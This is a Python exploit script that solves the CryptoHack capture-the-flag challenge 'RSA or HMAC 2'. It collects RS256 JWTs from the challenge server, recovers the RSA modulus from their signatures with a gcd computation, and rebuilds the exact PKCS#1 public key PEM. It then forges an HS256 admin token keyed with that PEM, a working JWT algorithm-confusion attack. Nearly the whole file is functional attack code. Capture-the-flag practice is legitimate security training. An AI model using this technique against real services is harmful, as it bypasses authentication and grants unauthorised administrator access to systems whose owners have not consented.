#!/usr/bin/env python3
"""
CryptoHack: RSA or HMAC 2 (web.cryptohack.org/rsa-or-hmac-2)

Fixes the common pitfall:
- Server PUBLIC_KEY is generated via: openssl rsa -RSAPublicKey_out ...
  => PEM header is: -----BEGIN RSA PUBLIC KEY-----
  => DER structure is PKCS#1 RSAPublicKey (SEQUENCE { n, e })

PyCryptodome exports public keys as "BEGIN PUBLIC KEY" (SPKI) which will NOT match
the server's PUBLIC_KEY bytes, so we must encode PKCS#1 ourselves.

Deps:
  pip install requests pycryptodome
"""

import base64
import hashlib
import hmac
import json
import math
from typing import List, Tuple

import requests
from Crypto.Util.asn1 import DerSequence, DerInteger

BASE = "https://web.cryptohack.org/rsa-or-hmac-2"
E = 65537
K_BYTES = 256  # 2048-bit RSA => 256 bytes signature

# ASN.1 DigestInfo prefix for SHA-256 in PKCS#1 v1.5 signatures
SHA256_DIGESTINFO_PREFIX = bytes.fromhex(
    "3031300d060960864801650304020105000420"
)


def b64url_decode(s: str) -> bytes:
    pad = "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def pem_wrap(label: str, der: bytes) -> bytes:
    """
    Wrap DER bytes into PEM with the given label.
    Ensures 64-char line breaks and a trailing newline.
    """
    b64 = base64.b64encode(der).decode()
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    pem = (
        f"-----BEGIN {label}-----\n"
        + "\n".join(lines)
        + f"\n-----END {label}-----\n"
    )
    return pem.encode()


def pkcs1_rs256_em(message: bytes, k: int) -> bytes:
    """
    EMSA-PKCS1-v1_5 encoding for SHA-256 (the "EM" that RSA verifies against).
    """
    h = hashlib.sha256(message).digest()
    t = SHA256_DIGESTINFO_PREFIX + h
    if k < len(t) + 11:
        raise ValueError("Encoded message length too short")
    ps = b"\xff" * (k - len(t) - 3)
    return b"\x00\x01" + ps + b"\x00" + t


def token_signing_input_and_sig(token: str) -> Tuple[bytes, bytes]:
    h_b64, p_b64, s_b64 = token.split(".")
    signing_input = (h_b64 + "." + p_b64).encode()
    sig = b64url_decode(s_b64)
    return signing_input, sig


def get_session(username: str) -> str:
    r = requests.get(f"{BASE}/create_session/{username}/", timeout=20)
    r.raise_for_status()
    tok = r.json()["session"]
    if isinstance(tok, bytes):
        tok = tok.decode()
    return tok


def recover_modulus(tokens: List[str]) -> int:
    """
    Recover RSA modulus n from RS256 JWT signatures using:
      n | (s^e - EM)
      n = gcd(s1^e - EM1, s2^e - EM2, ...)
    """
    g = 0
    for i, tok in enumerate(tokens, 1):
        msg, sig = token_signing_input_and_sig(tok)
        if len(sig) != K_BYTES:
            raise ValueError(f"Unexpected signature length {len(sig)} (expected {K_BYTES})")

        s = int.from_bytes(sig, "big")
        em = pkcs1_rs256_em(msg, K_BYTES)
        em_int = int.from_bytes(em, "big")

        x = abs(pow(s, E) - em_int)
        g = x if g == 0 else math.gcd(g, x)

        print(f"[{i}/{len(tokens)}] signature_bytes={len(sig)}, gcd_bits={g.bit_length()}")

    return g


def verify_recovered_n(n: int, token: str) -> bool:
    """Sanity check: verify one RS256 signature using recovered modulus n."""
    msg, sig = token_signing_input_and_sig(token)
    s = int.from_bytes(sig, "big")
    em = pkcs1_rs256_em(msg, K_BYTES)
    em_int = int.from_bytes(em, "big")
    return pow(s, E, n) == em_int


def build_pkcs1_rsa_public_key_pem(n: int, e: int = E) -> bytes:
    """
    Build PKCS#1 RSAPublicKey DER:
      RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
    Wrap into PEM with label "RSA PUBLIC KEY".
    """
    seq = DerSequence([DerInteger(n), DerInteger(e)])
    der = seq.encode()
    return pem_wrap("RSA PUBLIC KEY", der)


def forge_hs256_admin(public_pem: bytes) -> str:
    """
    Forge HS256 JWT with HMAC secret = PUBLIC_KEY PEM bytes (exact bytes matter).
    """
    header = {"typ": "JWT", "alg": "HS256"}
    payload = {"username": "admin", "admin": True}

    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()

    sig = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"


def authorise(token: str) -> dict:
    r = requests.get(f"{BASE}/authorise/{token}/", timeout=20)
    r.raise_for_status()
    return r.json()


def main():
    print("[*] Fetching RS256 sessions...")
    usernames = ["alice", "bob", "charlie", "dave", "eve", "frank"]
    tokens = [get_session(u) for u in usernames]

    print("[*] Recovering RSA modulus n from signatures...")
    n = recover_modulus(tokens)
    print(f"[+] Recovered n with bit_length={n.bit_length()}")

    print("[*] Verifying recovered n against a real token signature...")
    ok = verify_recovered_n(n, tokens[0])
    print(f"[+] RS256 verification with recovered n: {ok}")
    if not ok:
        raise RuntimeError("Recovered modulus n did not verify a known signature; try collecting more tokens.")

    print("[*] Building exact PKCS#1 PUBLIC_KEY PEM bytes (BEGIN RSA PUBLIC KEY)...")
    public_pem = build_pkcs1_rsa_public_key_pem(n, E)
    print("[+] PEM header:", public_pem.splitlines()[0].decode())

    print("[*] Forging HS256 admin token using PUBLIC_KEY bytes as HMAC secret...")
    evil = forge_hs256_admin(public_pem)

    print("[*] Calling authorise...")
    resp = authorise(evil)
    print(resp)


if __name__ == "__main__":
    main()